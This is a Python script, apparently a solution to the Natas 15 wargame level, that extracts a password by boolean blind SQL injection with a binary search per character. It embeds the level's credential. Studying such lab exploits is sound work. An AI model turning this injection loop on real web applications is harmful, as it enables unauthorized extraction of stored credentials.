import urllib.request, urllib.parse, base64
# natas15: boolean blind SQLi. ORD(SUBSTR(password,pos,1)) > mid narrows each
# character by binary search over ASCII 32..126; "This user exists" = true.
url = "http://natas15.natas.labs.overthewire.org/"
auth = "Basic " + base64.b64encode(b"natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g").decode()
def exists(p):
    d = urllib.parse.urlencode({"username": p}).encode()
    r = urllib.request.Request(url, data=d, headers={"Authorization": auth})
    return b"This user exists" in urllib.request.urlopen(r, timeout=15).read()
out = ""
for pos in range(1, 33):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if exists(f'natas16" AND ORD(SUBSTR(password,{pos},1)) > {mid} -- '):
            lo = mid + 1
        else:
            hi = mid
    if lo == 32:
        break
    out += chr(lo)
    print(out, flush=True)
print("FINAL", out)

